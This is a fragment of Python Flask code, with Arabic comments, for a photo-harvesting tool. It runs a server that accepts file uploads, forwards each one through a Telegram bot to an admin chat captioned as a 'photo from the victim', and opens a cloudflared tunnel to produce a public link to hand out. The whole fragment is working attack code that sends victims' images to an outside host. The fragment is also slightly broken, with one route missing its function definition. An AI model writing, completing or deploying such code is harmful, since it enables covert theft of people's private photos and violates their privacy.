@app.route('/')

    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return "No file", 400
    file = request.files['file']
    if file.filename == '':
        return "No name", 400
    
    try:
        # استخدام send_document عشان يستقبل أي صورة بأي حجم أو صيغة
        bot.send_document(ADMIN_CHAT_ID, file, caption=f"📸 صورة من الضحية: {file.filename}")
        print(f"[+] Sent: {file.filename}")
    except Exception as e:
        print(f"[-] Failed to send: {e}")
        
    return "OK", 200

def run_server():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

def run_tunnel():
    global GENERATED_URL
    print("[*] Starting cloudflared tunnel...")
    # تصحيح مسار الأداة
    cloudflared_path = os.path.expanduser('~/cloudflared')
    process = subprocess.Popen(
        [cloudflared_path, 'tunnel', '--url', 'http://localhost:5000'],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    for line in process.stdout:
        print(line, end='')
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            GENERATED_URL = match.group(0)
            print(f"\n[+] LINK GENERATED: {GENERATED_URL}\n")

def start_bot():
